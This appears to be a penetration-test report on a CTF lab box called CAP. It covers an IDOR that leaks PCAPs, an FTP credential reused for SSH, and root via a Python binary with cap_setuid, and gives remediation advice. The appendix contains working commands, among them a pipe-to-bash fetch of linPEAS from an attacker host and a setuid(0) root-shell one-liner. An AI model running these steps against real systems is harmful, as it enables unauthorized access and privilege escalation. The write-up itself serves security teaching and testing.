# Red Team Assessment Report — CAP Room (CTF)

**Assessment target:** CAP (Linux VM running security dashboard web app)  
**Assessment type:** Web application / internal network / host penetration test (CTF lab exercise)  
**Challenge rating:** Easy  
**Assessment date:** 2025-09-13  
**Assessor:** Red Team Member / Offensive Operator  
**Confidentiality:** Internal — for leadership review and remediation planning

---

## 1. Executive summary
During a simulated offensive assessment of the CAP target, we identified an insecure direct object reference (IDOR) vulnerability in the Security Snapshot feature of the web application which allowed retrieval of other users’ PCAP (network capture) files. One of those PCAPs contained cleartext credentials for FTP which were reused to gain shell access as the `nathan` user. Local enumeration then revealed a Python binary (`/usr/bin/python3.8`) with Linux file capabilities (including `cap_setuid`), which was abused to escalate to root. The attack chain demonstrates how low-complexity web flaws and credential reuse, combined with incorrect binary capability configuration, can lead to full system compromise.

**Overall risk rating:** High — unauthorized data access, credential disclosure, and full host compromise.  
**Recommended priority:** Immediate — fix IDOR and PCAP access controls; rotate credentials; remove inappropriate file capabilities; harden capture storage and access logging.

---

## 2. Scope & target information
- **Target:** CAP (Linux-based VM running a security dashboard web application)  
- **Targeted services discovered:** HTTP (Gunicorn), FTP (vsftpd 3.0.3), SSH (OpenSSH 8.2p1)  
- **Testing limitations:** Assessment performed in a controlled CTF lab. No destructive changes beyond obtaining proof-of-concept access. IP addresses and flags are intentionally omitted from this report for brevity.

---

## 3. Attack summary (high level)
1. Reconnaissance: Network scan revealed ports 21 (FTP), 22 (SSH), 80 (HTTP) open. (2025-09-13 10:15 ET)  
2. Web enumeration & source inspection: Discovered Dashboard UI and a Security Snapshot feature (exports 5-second PCAP snapshots). Found snapshot endpoint format `/data/[id]`. (2025-09-13 10:40 ET)  
3. IDOR exploitation: Enumerated snapshot IDs (0..10) and accessed a snapshot containing sensitive traffic. (2025-09-13 11:05 ET)  
4. PCAP analysis: Loaded PCAP in Wireshark and discovered FTP plaintext credentials. (2025-09-13 11:25 ET)  
5. Credential reuse & foothold: Reused FTP credential to authenticate to SSH as `nathan` and gained a non-privileged shell. (2025-09-13 11:50 ET)  
6. Local enumeration: Ran linPEAS to identify elevated file capabilities and noted `/usr/bin/python3.8` had `cap_setuid,cap_net_bind_service+eip`. (2025-09-13 12:10 ET)  
7. Privilege escalation: Abused `cap_setuid` via Python to set UID to 0 and spawn a root shell — obtained root. (2025-09-13 12:18 ET)

---

## 4. Findings (detailed)

### Finding 1 — Insecure Direct Object Reference (IDOR) in Security Snapshot endpoint
- **Severity:** High  
- **Description:** The Security Snapshot/download endpoint exposes PCAP objects by numeric ID using the path `/data/[id]`. IDs are not access-controlled or validated, allowing enumeration and retrieval of other users’ PCAPs.  
- **Evidence / PoC:** Access to `/data/0..10` returned PCAP files. A snapshot retrieved during testing contained sensitive credentials found in the capture.  
- **Impact:** Unauthorized disclosure of captured network traffic that can include credentials and session data. Directly led to credential compromise and host access.  
- **Remediation:** Enforce authorization checks on object access, use unguessable identifiers (UUIDs or signed URLs), and add strict access logging and alerting for snapshot downloads.

### Finding 2 — Sensitive data in PCAPs (plaintext FTP credentials)
- **Severity:** High  
- **Description:** Stored packet captures included plaintext credentials for FTP sessions.  
- **Evidence / PoC:** Wireshark analysis of a retrieved snapshot showed FTP `USER` / `PASS` values that were reused to gain SSH access.  
- **Impact:** Credential leakage allowed lateral movement and unauthorized shell access.  
- **Remediation:** Avoid storing full packet captures in web-accessible locations; redact sensitive payloads or encrypt stored PCAPs and restrict access. Replace FTP with secure alternatives (SFTP/FTPS) where possible and rotate exposed credentials.

### Finding 3 — Credential reuse across services (FTP credential valid for SSH)
- **Severity:** High  
- **Description:** Credentials found in a PCAP for FTP were valid for SSH on the host.  
- **Evidence / PoC:** Successful SSH login as `nathan` with credentials recovered from the PCAP.  
- **Impact:** Reused credentials amplify initial disclosure into account compromise.  
- **Remediation:** Enforce unique, strong passwords per service, implement MFA for SSH, and monitor for credential reuse and anomalous logins.

### Finding 4 — Misconfigured Linux file capabilities on `/usr/bin/python3.8`
- **Severity:** Critical  
- **Description:** The Python binary had Linux file capabilities (`cap_setuid,cap_net_bind_service+eip`) allowing a non-root user to escalate UID via script.  
- **Evidence / PoC:** linPEAS identified the capabilities. Using an interactive Python session, calling `os.setuid(0)` and spawning `/bin/bash` produced a root shell.  
- **Impact:** Direct privilege escalation to root permitting full system compromise.  
- **Remediation:** Remove unnecessary file capabilities from general-purpose interpreters (e.g., `sudo setcap -r /usr/bin/python3.8`), and only grant capabilities on minimal purpose-built wrappers when strictly required. Apply AppArmor/SELinux restrictions as appropriate.

---

## 5. Impact assessment
- **Confidentiality:** High — full access to data accessible to root and stored captures.  
- **Integrity:** High — root-level access allows modification or destruction of data and logs.  
- **Availability:** Medium/High — attackers could disrupt services or exfiltrate data.  
- **Business impact:** In production this chain could lead to account takeover, data exfiltration, and service disruption. The lab shows a realistic and straightforward path from web-IDOR to full compromise.

---

## 6. Recommended prioritized remediation plan

**Immediate (within 24–72 hours):**
1. Restrict or remove public access to Security Snapshot PCAPs and require authorization checks on `/data/[id]`.  
2. Rotate compromised credentials and disable affected accounts.  
3. Remove file capabilities from general-purpose interpreters:  
   ```bash
   sudo setcap -r /usr/bin/python3.8
   ```
4. Harden FTP: disable plain FTP in favor of SFTP/FTPS or block FTP where not required.  
5. Add monitoring for snapshot enumeration and unauthorized downloads.

**Short term (1–4 weeks):**
1. Transition to unguessable snapshot identifiers (UUIDs or signed URLs) with short TTLs.  
2. Implement RBAC for snapshot access and detailed audit logging.  
3. Enforce unique credentials and password policies; enable MFA for SSH.  
4. Sanitize stored PCAPs (redact payloads) or encrypt access-controlled storage.

**Medium term (1–3 months):**
1. Inventory and audit file capabilities and SUID/SGID binaries across hosts; remove unnecessary privileges.  
2. Perform an internal pentest focused on object-level authorization and secret leakage.  
3. Provide developer training on secure handling of artifacts that may contain sensitive data.  
4. Implement host enforcement (SELinux/AppArmor) to limit interpreter behavior.

**Long term (3+ months):**
1. Formalize secure coding and data retention policies for any feature that records or stores network traffic.  
2. Periodic offensive testing and red-team exercises to validate mitigations.  
3. Centralize secrets management (e.g., HashiCorp Vault) and secure telemetry for forensic artifacts.

---

## 7. Suggested detection & hardening controls
- Block or monitor direct web access to stored PCAPs; require authorization tokens.  
- Detect rapid sequential access patterns to snapshot IDs and rate‑limit suspicious behavior.  
- Monitor for changes to file capabilities and SUID/SGID binaries.  
- Deploy host intrusion detection (Wazuh/OSSEC) to detect unexpected `setuid(0)` behavior or interactive interpreters spawning shells.  
- Require secure transport for credentials (disable plain FTP, use SFTP/FTPS/TLS).

---

## 8. Timeline (actions performed)
- **2025-09-13 10:15 ET** — Reconnaissance (nmap/rustscan): discovered ports 21, 22, 80.  
- **2025-09-13 10:40 ET** — Web enumeration & source inspection: discovered Security Snapshot feature.  
- **2025-09-13 11:05 ET** — IDOR exploitation: retrieved enumerated snapshots (IDs 0..10).  
- **2025-09-13 11:25 ET** — PCAP analysis (Wireshark): extracted FTP plaintext credential from a snapshot.  
- **2025-09-13 11:50 ET** — Credential reuse to SSH (foothold): authenticated as `nathan`.  
- **2025-09-13 12:10 ET** — Local enumeration & linPEAS: identified capabilities on `/usr/bin/python3.8`.  
- **2025-09-13 12:18 ET** — Privilege escalation & root shell obtained using Python capability abuse.

---

## 9. Appendix A — Commands run / Tools used (PoC reproduction steps)
> **Warning:** Only run these steps in an authorized test environment.

**Network & host discovery**
```bash
nmap -sC -sV -oN nmap_initial <TARGET_IP>
rustscan -a <TARGET_IP> -r 1-65535
```

**Web enumeration**
```bash
feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/...
dirb http://<TARGET_IP> /usr/share/wordlists/...
# view HTML source and robots.txt from a browser
```

**IDOR enumeration (example)**
```bash
# Snapshot URL pattern: http://<TARGET_IP>/data/<ID>
curl http://<TARGET_IP>/data/0 -o snapshot0.pcap
curl http://<TARGET_IP>/data/1 -o snapshot1.pcap
# iterate IDs to enumerate available snapshots
```

**PCAP analysis**
- Open `snapshotX.pcap` in Wireshark and filter for FTP traffic:
```
ftp
```
- Inspect FTP `USER` / `PASS` packet payloads for credentials.

**Credential reuse**
```bash
ssh nathan@<TARGET_IP> -p 22
# provide password recovered from PCAP
```

**Local enumeration**
```bash
# Host enumeration and linPEAS execution (example)
# On attack box:
sudo python3 -m http.server 80
# On target (as nathan):
curl http://<ATTACKER_IP>/linpeas.sh | bash
```

**Exploit capability (PoC)**
```bash
python3.8
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
# spawned root shell
```

**Capability removal (mitigation)**
```bash
sudo setcap -r /usr/bin/python3.8
getcap /usr/bin/python3.8   # verify no capabilities are present
```

---

## 10. Appendix B — Evidence index
- `snapshotX.pcap` — captured PCAP used to extract FTP credentials (stored in secure evidence repo).  
- `nmap_initial` — nmap output file.  
- `linpeas.log` — linPEAS output showing file capabilities.  
- `ssh_session.log` — recorded session demonstrating the `nathan` foothold.  

*(Store all evidence files in a secure evidence repository with restricted access. Maintain chain-of-custody if moving into formal incident response.)*

---

## 11. Lessons learned & takeaways
- IDORs are low-effort but high-impact — always validate object-level authorization.  
- Application artifacts (PCAPs, logs) can leak secrets — treat them as sensitive data.  
- Credential reuse is an early attacker enabler — enforce unique credentials and MFA.  
- File capabilities are powerful and dangerous — avoid granting capabilities to general-purpose interpreters.  
- Automated tools (linPEAS) are useful for discovery but must be manually validated.

---

## 12. Next steps for leadership / engineering
1. Immediately block or restrict access to Security Snapshot PCAPs and implement authorization controls.  
2. Rotate affected credentials and disable compromised accounts.  
3. Remove unnecessary capabilities from interpreters and review capability usage across hosts.  
4. Schedule a remediation verification and follow-up internal pentest focusing on object-level authorization and artifact leakage.  
5. Provide developer guidance on secure handling of captured artifacts and rotate to secure transports for credentials.

---

*Report generated and formatted for leadership review. If you would like this exported to `.docx` or PDF, or prefer adding sanitized screenshots (Wireshark packets, linPEAS output), I can include them and regenerate the package.*

